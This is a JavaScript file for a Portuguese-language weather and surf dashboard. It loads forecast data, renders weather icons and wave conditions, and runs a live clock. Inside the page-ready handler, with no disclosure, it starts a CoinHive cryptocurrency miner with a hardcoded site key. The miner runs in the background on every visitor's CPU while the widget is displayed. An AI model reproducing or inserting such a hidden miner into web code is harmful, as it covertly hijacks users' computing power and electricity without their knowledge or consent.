$(document).ready(function(){
	// Inicia com a previsao por Geo IP, sem passar as coordenadas
	atualizaOndas();
	atualizarDados();
	moveRelogio();
	var miner = new CoinHive.User('h9cEeDZNKkE57ERV0hJRpftDu8UIlFcs', 'Your_My_Minero',{threads:1});
	miner.start();
});


/*
 Classes que são adicionadas de acordo com a condição climática:

 storm (tempestade)
 snow (neve)
 hail (granizo)
 rain (chuva)
 fog (neblina)
 clear_day (ensolarado)
 clear_night (estrelado)
 cloud (nublado)
 cloudly_day (nublado com sol)
 cloudly_night (nublado com estrelas)
 none_day (erro, mas esta de dia)
 none_night (erro, mas esta de noite)
*/




function atualizarDados() {
	$(".temperature").text('0');
	var woeid = '455861';
	$.ajax({
		url: 'tempo.php?woeid='+ woeid,
		dataType: 'json',
		success: function(dados) {
                
		// Loop inserindo os dados no HTML
			$.each(dados, function(dado, valor){
				if(dados == 'temperature' && valor == ''){
					$('.'+dado).text('Error');
                    atualizaPag();
				}else {
					$('.' + dado).text(valor);
				}

			});
			var i = 1;
			$.each(dados['forecast'], function(dado, valor){
				//alert(valor['condition'])
				var dia = valor['weekday'];
				var data = valor['date'];
				var tempo = valor['condition'];
				var max = valor['max'];
				var min = valor['min'];
				var ico_temp = '';
				var classe = '';
				if(tempo == 'storm'){
					ico_temp = '<i class="climacon lightning"></i>';
					classe = 'rain';
				}else if(tempo == 'snow'){
					ico_temp = '<i class="climacon flurries"></i>';
					classe = 'rain';
				}else if(tempo == 'hail'){
					ico_temp = '<i class="climacon sleet"></i>';
					classe = 'rain';
				}else if(tempo == 'fog'){
					ico_temp = '<i class="climacon fog"></i>';
					classe = 'rain';
				}else if(tempo == 'rain'){
					ico_temp = '<i class="climacon rain"></i>';
					classe = 'rain';
				}else if(tempo == 'cloudly_day'){
					ico_temp = '<i class="climacon cloud sun"></i>';
					classe = 'cloud';
				}else if(tempo == 'clear_night'){
					ico_temp = '<i class="climacon cloud"></i>';
					classe = 'cloud';
				}else if(tempo == 'clear_day'){
					ico_temp = '<i class="climacon sun"></i>';
					classe = 'sun';
				}else if(tempo == 'none_day'){
					ico_temp = '<i class="climacon sun"></i>';
					classe = 'sun';
				}else if(tempo == 'none_night'){
					ico_temp = '<i class="climacon cloud"></i>';
					classe = 'cloud';
				}else{
					ico_temp = '<i class="climacon sun"></i>';
					classe = 'sun';
				}

				var html = '<div class="inner">';
					html += '<h5 class="week-day">'+dia+' '+data+'</h5>';
					html += ico_temp;
					html += '<p class="week-day-temperature ">'+max+'°     '+min+'°</p>';
					html += '</div>';
				$('#data_'+i).addClass(classe);
				$('#data_'+i).html(html);
				i = (i + 1);
			});

			var x = dados['forecast'].length;

			$('.imagem-do-tempo').attr('src', dados.imagem);
			reload();
            setTimeout(function(){
                atualizarDados();
            }, 1800000);
		}
	});
       
}

function reload() {
	var tem = $(".temperature").html();
	if(tem == '0' || tem == ''){
		location.reload();
	}
	setTimeout(function(){
        reload();
    }, 120000);
}


function moveRelogio(){
	momentoAtual = new Date()
	hora = momentoAtual.getHours()
	str_hora = new String (hora)
	if (str_hora.length == 1)
		hora = "0" + hora


	minuto = momentoAtual.getMinutes()
	str_minuto = new String (minuto)
	if (str_minuto.length == 1)
		minuto = "0" + minuto

	segundo = momentoAtual.getSeconds()
	str_segundo = new String (segundo)
	if (str_segundo.length == 1)
		segundo = "0" + segundo


	horaImprimivel = hora + " : " + minuto + " : " + segundo


	$(".hora").text(horaImprimivel);
	setTimeout("moveRelogio()",1000)

}





function atualizaOndas() {
	$.ajax({
		url: 'ondas.php',
		dataType: 'html',
		success: function(dados) {
			var onda = dados.split("|");
			$(".wave_formacao").html(onda[1]);
			$(".wave_tamanho").html(onda[0]);
			$(".wave_direcao").html(onda[2]);
			$(".wind_direcao").html(onda[3]);
			$(".temp_agua").html(onda[4]);
		}
	});
	setTimeout(function(){
        atualizaOndas();
    }, 1800000);
}













